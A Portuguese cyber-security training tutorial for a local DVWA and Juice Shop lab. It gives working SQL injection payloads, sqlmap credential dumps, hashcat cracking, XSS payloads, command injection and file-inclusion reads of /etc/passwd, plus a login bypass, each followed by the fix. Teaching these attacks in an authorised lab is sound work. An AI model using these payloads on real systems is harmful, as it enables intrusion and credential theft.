# Tutorial Passo a Passo — Primeiros Ataques no Lab Web
### Cyber SENAI Porto · WorldSkills Cyber Security · DVWA + Juice Shop

> **Para o aluno aprender.** Cada ataque segue a mesma lógica das provas:
> **o que é (conceito) → como fazer → o que observar → como corrigir.**
> Uso **autorizado** apenas: este é um laboratório local, de treino.

---

## Parte 0 — Preparar o ambiente (5 min)

1. Confirme que o lab está no ar (no terminal do Kali):
   ```
   docker ps
   ```
   Devem aparecer: `lab-dvwa`, `lab-juice-shop`, `lab-webgoat`, `lab-wordpress`, `lab-wp-db`.

   **Não apareceu nada, ou faltam containers? Inicie os serviços.** É normal estarem desligados depois de reiniciar a VM:
   ```
   # 1) garante que o serviço do Docker está ligado
   sudo systemctl start docker

   # 2) entra na pasta do lab e sobe os alvos
   cd ~/lab
   docker compose up -d        # se der "command not found", use: docker-compose up -d
   ```
   Espere alguns segundos e rode `docker ps` de novo — os 5 containers devem aparecer com status **Up**.
   > 💡 O `up -d` sobe em segundo plano e **reaproveita** as imagens já baixadas, então é rápido (não baixa tudo de novo). Para desligar no fim do dia: `docker compose down` (os dados do DVWA/WordPress continuam salvos para a próxima vez).

2. Abra o **Firefox** no Kali e acesse o **DVWA**: `http://localhost:8081`
   - Login: **admin** / **password**
   - Clique em **Create / Reset Database** (botão no fim da página) e logue de novo.
   - Vá em **DVWA Security** (menu esquerdo) e selecione **Low**. (Comece fácil; depois suba.)

3. Abra também o **Juice Shop**: `http://localhost:3000` (vamos usar na Parte 6).

> 💡 Dica: deixe o **Burp Suite** aberto em paralelo (Proxy → Intercept Off, só para ver o histórico das requisições). Opcional, mas ajuda a entender o que acontece.

---

## Parte 1 — Reconhecimento (10 min)

**O que é:** antes de atacar, você mapeia o alvo — portas, serviços e tecnologias. É o primeiro passo de qualquer teste.

### E se você NÃO souber o endereço do alvo?

No nosso lab já sabemos que é `localhost`. Mas num teste real você recebe só uma **faixa de IPs** (um escopo), e precisa **descobrir o alvo** primeiro:

1. Descubra a **sua** rede: `ip a` — veja seu IP e a máscara (ex.: `192.168.56.0/24`).
2. Ache os **hosts vivos** na faixa: `nmap -sn 192.168.56.0/24` ou `netdiscover -r 192.168.56.0/24` (este último usa ARP, acha até quem ignora ping).
3. Identifique **qual** é o alvo pelo serviço: `nmap -p 80,443,3000,8080 --open 192.168.56.0/24` (quem tiver web aberto é candidato).
4. Com o IP em mãos, siga o recon normal: `nmap -sV IP` e `whatweb http://IP`.

Se te deram um **domínio** em vez de IP, resolva antes: `dig alvo.local +short` (ou `nslookup alvo.local`).

> 💡 No lab os alvos sobem em containers no próprio Kali, por isso usamos `localhost`. Se um alvo estiver em **outra VM** (ex.: Metasploitable na rede host-only), é exatamente esse processo (passos 1→4) que você usa para encontrá-lo.

**Como fazer (no nosso lab, com o endereço conhecido):**
```
whatweb http://localhost:8081
```
Veja o servidor (Apache), a linguagem (PHP) e o framework.

```
nmap -sV -p 8081,3000,8080,8082 localhost
```
Confirma os serviços rodando em cada porta.

**E se eu não souber as portas?** Aqui eu listei as portas porque **nós** definimos os alvos no `docker-compose` (8081, 3000, 8080, 8082) — foi um atalho do lab. Normalmente você **não** sabe; aí quem descobre é o nmap:

- **Padrão** (as 1000 portas mais comuns): `nmap -sV IP` — sem `-p`, ele já varre as mais usadas.
- **Todas** as 65535 portas (completo): `nmap -p- IP` — mais lento, mas não deixa passar serviço em porta incomum.
- **Rápido e completo:** `nmap -p- --min-rate 1000 -T4 IP` para achar as portas abertas, depois `nmap -sV -p PORTAS_ABERTAS IP` só nelas.

Regra: **porta conhecida → use `-p`; porta desconhecida → descubra com `-p-` (ou o scan padrão) e só então rode o `-sV`.**

**O que observar:** anote a tecnologia de cada alvo. Saber que é PHP + MySQL já diz que **SQL Injection** é um caminho provável.

---

## Parte 2 — SQL Injection (SQLi) no DVWA (40 min)

**O que é:** a aplicação monta uma consulta SQL **juntando a sua entrada como texto**, sem tratar. Se você colocar caracteres de SQL (como a aspa `'`), consegue **mudar o sentido da consulta** — ler dados que não deveria, burlar login, etc. É a CWE-89 e uma das falhas mais críticas.

### 2.1 Entenda a query por trás (o "porquê")

Quando você digita um ID no DVWA, por baixo dos panos ele roda algo assim:
```sql
SELECT first_name, last_name FROM users WHERE user_id = '  SUA_ENTRADA  ';
```
Repare que a sua entrada entra **entre aspas**. Se você digitar `1`, vira:
```sql
... WHERE user_id = '1';
```
Mas se você digitar `1' OR '1'='1`, vira:
```sql
... WHERE user_id = '1' OR '1'='1';
```
Agora a condição `'1'='1'` é **sempre verdadeira** → o banco devolve **todos** os usuários. Foi você que "abriu a aspa" e injetou lógica nova. Esse é o coração do SQLi.

### 2.2 Testar do zero (passo a passo)

1. No DVWA (nível **Low**), vá em **SQL Injection**.
2. **Comportamento normal:** no campo **User ID**, digite `1` e clique em Submit. Aparece 1 usuário (`First name` / `Surname`). Guarde essa imagem mental do "normal".
3. **Testar se é injetável:** digite só uma aspa e Submit:
   ```
   1'
   ```
   **O que observar:** aparece um **erro de SQL** (algo como `You have an error in your SQL syntax...`) ou o resultado some. Erro = você quebrou a sintaxe = **é injetável**. (Se não der erro, o campo pode estar tratando a entrada.)
4. **Confirmar a injeção** (condição sempre verdadeira):
   ```
   1' OR '1'='1
   ```
   **O que observar:** retornam **vários** usuários. Confirmado.

> 💡 Dica: no DVWA a SQLi é por **GET**, então dá para fazer tudo pela URL também: `.../vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit` (lembre de codificar espaços como `%20` se precisar).

### 2.3 Extrair dados de verdade com UNION (a parte importante)

Confirmar a falha é só o começo. Para **extrair dados** usamos a técnica **UNION SELECT**, que "cola" o resultado de uma segunda consulta (sua) no resultado da primeira. Para funcionar, a sua consulta precisa ter o **mesmo número de colunas** que a original. Vamos descobrir isso em etapas:

**Passo 1 — Descobrir quantas colunas a consulta tem** (com `ORDER BY`):
```
1' ORDER BY 1-- -
1' ORDER BY 2-- -
1' ORDER BY 3-- -
```
Vá aumentando o número. Quando der **erro** (ex.: no `3`), significa que a consulta tem **2 colunas** (o último que funcionou). O `-- -` no fim é um **comentário SQL**: ele "apaga" o resto da query original (a aspa que sobraria). *(No MySQL é traço-traço-espaço; por isso `-- -`.)*

**Passo 2 — Ver onde cada coluna aparece na tela:**
```
0' UNION SELECT 1,2-- -
```
**O que observar:** aparece `First name: 1` e `Surname: 2`. Ou seja, a coluna 1 vira o "First name" e a 2 o "Surname". *(Usei `0'` — um ID que não existe — para a tela mostrar **só** os dados injetados, sem o usuário 1 no meio.)*

**Passo 3 — Pegar informações do banco** (prova de que você controla a consulta):
```
0' UNION SELECT user(),version()-- -
0' UNION SELECT database(),2-- -
```
**O que observar:** o usuário do banco (ex.: `root@localhost`), a versão do MySQL e o **nome do banco** (ex.: `dvwa`).

**Passo 4 — Listar as tabelas do banco:**
```
0' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()-- -
```
**O que observar:** aparecem as tabelas (ex.: `guestbook`, `users`). A tabela `users` é o alvo.

**Passo 5 — Listar as colunas da tabela `users`:**
```
0' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'-- -
```
**O que observar:** colunas como `user_id`, `first_name`, `user`, `password`, `avatar`. As que interessam: **`user`** e **`password`**.

**Passo 6 — Extrair as credenciais (o prêmio):**
```
0' UNION SELECT user,password FROM users-- -
```
**O que observar:** a lista de usuários e seus **hashes de senha** (MD5). Guarde o hash do **admin** — vamos quebrá-lo no 2.5.

> Resumo da técnica UNION: **conte as colunas (ORDER BY) → ache a posição visível (UNION SELECT 1,2) → navegue pelo `information_schema` (tabelas → colunas) → extraia os dados.** É sempre essa sequência.

### 2.4 Automatizar com sqlmap (quando o manual fica repetitivo)

O **sqlmap** faz tudo isso sozinho. Mas ele precisa se passar por você (logado), então você fornece o **cookie da sessão**.

**Pegar o cookie — jeito mais fácil (pelo Console):**
1. Esteja **logado** no DVWA no Firefox.
2. Pressione **F12**. Ele abre no **Inspetor** por padrão — clique na aba **Console** (no topo do painel das ferramentas de desenvolvedor).
3. Na linha de digitação (com o `>`), escreva e dê **Enter**:
   ```
   document.cookie
   ```
4. Ele imprime a string completa dos cookies, por exemplo:
   ```
   "language=en; cookieconsent_status=dismiss; PHPSESSID=h2tcr4rn6vqisv5ptmjpn76of1; security=low"
   ```
5. Dessa string, use só as **duas** partes que importam: **`PHPSESSID=...`** e **`security=low`** (pode ignorar `language` e `cookieconsent`).

**Alternativa (pela aba Armazenamento):** com o F12 aberto, clique na aba **Armazenamento** (se ela não aparecer, clique na setinha **`>>`** no fim das abas para ver as escondidas) → abra **Cookies** → clique em **`http://localhost:8081`** → copie o valor de **`PHPSESSID`** e confirme que há **`security = low`**.

**Rodar o sqlmap (de forma progressiva):**

1. Detectar a injeção:
   ```
   sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=SEU_PHPSESSID; security=low" --batch
   ```
2. Listar os bancos: adicione `--dbs`
3. Listar as tabelas do `dvwa`: `-D dvwa --tables`
4. Listar as colunas da `users`: `-D dvwa -T users --columns`
5. Extrair só o que importa:
   ```
   sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=SEU_PHPSESSID; security=low" --batch -D dvwa -T users -C user,password --dump
   ```

**O que cada parte faz:** `-u` = a URL/alvo · `--cookie` = sua sessão · `--batch` = responde "sim" sozinho · `--dbs/-D` = bancos · `--tables/-T` = tabelas · `--columns/-C` = colunas · `--dump` = extrai os dados.

**Entendendo o que aparece no terminal (não se assuste com o monte de texto):**

Quando rodar o 1º comando (detecção), o sqlmap mostra algo assim — você só precisa achar as linhas-chave:
```
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.8}
|_ -| . [']     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|

[*] starting @ 16:50:12 /2026-11-25/

[16:50:12] [INFO] testing connection to the target URL
[16:50:13] [INFO] testing if GET parameter 'id' is dynamic
[16:50:13] [INFO] GET parameter 'id' appears to be dynamic
[16:50:13] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable
[16:50:15] [INFO] GET parameter 'id' is 'AND boolean-based blind' injectable
[16:50:16] [INFO] GET parameter 'id' is 'MySQL >= 5.0 error-based' injectable
[16:50:17] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
[16:50:17] [INFO] the back-end DBMS is MySQL
GET parameter 'id' is vulnerable.
web application technology: Apache, PHP
back-end DBMS: MySQL >= 5.0
```
👉 **O que procurar aqui:**
- A linha **`GET parameter 'id' is vulnerable`** → achou a falha! 🎯
- As linhas **`Type: boolean-based blind / error-based / UNION query`** → são as técnicas que funcionaram (o sqlmap vai usar a melhor sozinho).
- **`back-end DBMS is MySQL`** → ele descobriu o tipo de banco (a partir daqui sabe como extrair).
- Se aparecer alguma pergunta `[y/N]`, o `--batch` já responde por você — não precisa fazer nada.

Quando você adicionar `--dbs`, procure por:
```
available databases [2]:
[*] dvwa
[*] information_schema
```
👉 O **`dvwa`** é o nosso banco (o `information_schema` é o "catálogo" interno do MySQL).

E o **`--dump`** (o prêmio) mostra a tabela com as credenciais:
```
Database: dvwa
Table: users
[5 entries]
+---------+---------------------------------------------+
| user    | password                                    |
+---------+---------------------------------------------+
| admin   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
| gordonb | e99a18c428cb38d5f260853678922e03 (abc123)   |
| 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  |
| pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  |
| smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
+---------+---------------------------------------------+
```
👉 **O que procurar aqui:**
- Cada linha é um **usuário** e o **hash** da senha dele.
- Repare: o sqlmap até **quebra** os hashes conhecidos e mostra a senha em **parênteses** — ex.: `admin` → `(password)`. (Se ele perguntar "crack them via dictionary-based attack? [Y/n]", é só deixar seguir.)

> 💡 **Resumo do que caçar na tela:** `is vulnerable` (achou) → `available databases` (onde está) → a **tabela do `--dump`** (o que você queria). O resto do texto é o sqlmap "pensando" — pode ignorar.

### 2.5 Quebrar o hash (do hash ao texto claro)

Os hashes do DVWA são **MD5** (modo `-m 0` no hashcat):
```
echo 'HASH_DO_ADMIN' > hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```
Se a wordlist estiver zipada: `gunzip /usr/share/wordlists/rockyou.txt.gz` antes. Veja o resultado com `hashcat -m 0 hash.txt --show`. **O que observar:** a senha em texto claro aparece ao lado do hash (a do admin costuma ser `password`).

### 2.6 Como corrigir 🟢

A raiz do problema é **misturar dado com código**. A correção é **separar** usando **consultas parametrizadas** (prepared statements) — o `?` é um espaço reservado e o valor entra **como dado**, nunca como SQL:
```php
// 🔴 Vulnerável
$sql = "SELECT first_name,last_name FROM users WHERE user_id = '$id'";

// 🟢 Seguro
$stmt = $pdo->prepare("SELECT first_name,last_name FROM users WHERE user_id = ?");
$stmt->execute([$id]);
```
Com isso, mesmo que o usuário digite `1' OR '1'='1`, o banco procura **literalmente** por esse texto como ID — a injeção deixa de funcionar.

> 🎯 **Desafio extra:** mude o DVWA para **Medium** e tente de novo. Lá a entrada vai por POST e há um filtro simples — você vai precisar adaptar os payloads (ex.: sem aspas, usando o `id` numérico). É assim que se treina para a prova.

---

## Parte 3 — XSS Refletido no DVWA (15 min)

**O que é:** a aplicação devolve a sua entrada na página **sem escapar**, e o navegador executa como HTML/JS. CWE-79.

**Como fazer:**
1. No DVWA, vá em **XSS (Reflected)**.
2. No campo de nome, digite:
   ```
   <script>alert('XSS')</script>
   ```
   e Submit. **O que observar:** aparece a caixinha de alerta — seu script rodou no navegador.
3. Teste uma variação sem `<script>` (para entender filtros):
   ```
   <img src=x onerror=alert('XSS')>
   ```

**Impacto:** com XSS dá para roubar cookies de sessão, redirecionar, etc.

**Como corrigir 🟢:** **escape a saída** por contexto (ex.: `htmlspecialchars()` em PHP) e use `Content-Security-Policy`.

---

## Parte 4 — Command Injection no DVWA (15 min)

**O que é:** a aplicação passa a sua entrada para um **comando do sistema** sem tratar. Você anexa um segundo comando. CWE-78.

**Como fazer:**
1. No DVWA, vá em **Command Injection**.
2. No campo de IP, digite um IP normal: `127.0.0.1` → ele faz um ping.
3. Agora digite:
   ```
   127.0.0.1; cat /etc/passwd
   ```
   **O que observar:** além do ping, aparece o conteúdo do `/etc/passwd` — você executou um comando no servidor.
4. Teste também `127.0.0.1 && whoami`.

**Como corrigir 🟢:** nunca montar comando com entrada do usuário; usar APIs seguras / listas de argumentos e validar a entrada (allowlist).

---

## Parte 5 — File Inclusion / LFI no DVWA (15 min)

**O que é:** a aplicação inclui um arquivo cujo caminho vem da sua entrada, sem validar. Você lê arquivos do servidor. CWE-98.

**Como fazer:**
1. No DVWA, vá em **File Inclusion**.
2. Repare na URL: `...?page=include.php`.
3. Troque o parâmetro por um arquivo do sistema:
   ```
   http://localhost:8081/vulnerabilities/fi/?page=/etc/passwd
   ```
   **O que observar:** o conteúdo do `/etc/passwd` aparece na página.
4. Teste "path traversal": `?page=../../../../etc/passwd`

**Como corrigir 🟢:** nunca incluir caminho vindo do usuário; usar **allowlist** de arquivos permitidos e caminho absoluto fixo.

---

## Parte 6 — Juice Shop: login como admin via SQLi (15 min)

**O que é:** mesmo princípio da Parte 2, agora numa aplicação moderna (SPA).

**Como fazer:**
1. Abra `http://localhost:3000` e vá em **Account → Login**.
2. No campo **Email**, digite:
   ```
   ' OR 1=1--
   ```
   No campo **Password**, digite qualquer coisa. Clique em **Log in**.
   **O que observar:** você entra **como o primeiro usuário (admin)** — a injeção burlou a autenticação.
3. Explore o **placar de desafios**: `http://localhost:3000/#/score-board` (achar o placar já é um desafio!).

**Como corrigir 🟢:** consultas parametrizadas + **nunca** autenticar comparando string montada com a entrada.

---

## Encerramento

- Suba a dificuldade do DVWA (**Medium** → **High**) e veja como os mesmos ataques exigem técnicas melhores (bypass de filtros).
- Fixe a lógica: **toda** injeção nasce de **misturar dado com código** — e a defesa é sempre **separar** (parametrizar / escapar / validar).
- Para a competição, treine **velocidade**: reconhecer a falha e explorar rápido, documentando cada passo (print + comando) para o relatório.

➡️ Quando você dominar isto, parta para o **WebGoat** (`http://localhost:8080/WebGoat`), que traz lições guiadas mais avançadas.
